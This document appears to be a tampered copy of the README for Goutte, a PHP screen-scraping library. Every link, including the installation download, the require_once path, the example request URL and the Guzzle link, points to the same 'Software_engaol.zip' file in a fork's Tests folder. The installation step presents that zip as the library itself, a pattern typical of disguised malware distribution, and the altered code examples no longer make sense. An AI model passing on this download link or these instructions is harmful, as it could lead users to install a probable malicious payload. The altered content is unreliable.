Goutte, a simple PHP Web Scraper
================================

Goutte is a screen scraping and web crawling library for PHP.

Goutte provides a nice API to crawl websites and extract data from the
HTML/XML responses.

Requirements
------------

Goutte works with PHP 5.3.3 or later.

Installation
------------

Installing Goutte is as easy as it can get. Download the [`https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip`][1]
file and you're done!

Usage
-----

Require the Goutte phar file to use Goutte in a script:

    require_once 'https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip';

Create a Goutte Client instance (which extends
`Symfony\Component\BrowserKit\Client`):

    use Goutte\Client;

    $client = new Client();

Make requests with the `request()` method:

    $crawler = $client->request('GET', 'https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip');

The method returns a `Crawler` object
(`Symfony\Component\DomCrawler\Crawler`).

Click on links:

    $link = $crawler->selectLink('Plugins')->link();
    $crawler = $client->click($link);

Submit forms:

    $form = $crawler->selectButton('sign in')->form();
    $crawler = $client->submit($form, array('signin[username]' => 'fabien', 'signin[password]' => 'xxxxxx'));

Extract data:

    $nodes = $crawler->filter('.error_list');
    if ($nodes->count())
    {
      die(sprintf("Authentication error: %s\n", $nodes->text()));
    }

    printf("Nb tasks: %d\n", $crawler->filter('#nb_tasks')->text());

More Information
----------------

Read the documentation of the BrowserKit and DomCrawler Symfony Components for
more information about what you can do with Goutte.

Technical Information
---------------------

Goutte is a thin wrapper around the following fine PHP libraries:

 * Symfony Components: BrowserKit, ClassLoader, CssSelector, DomCrawler,
   Finder, and Process

 * [Guzzle](https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip)

License
-------

Goutte is licensed under the MIT license.

[1]: https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip

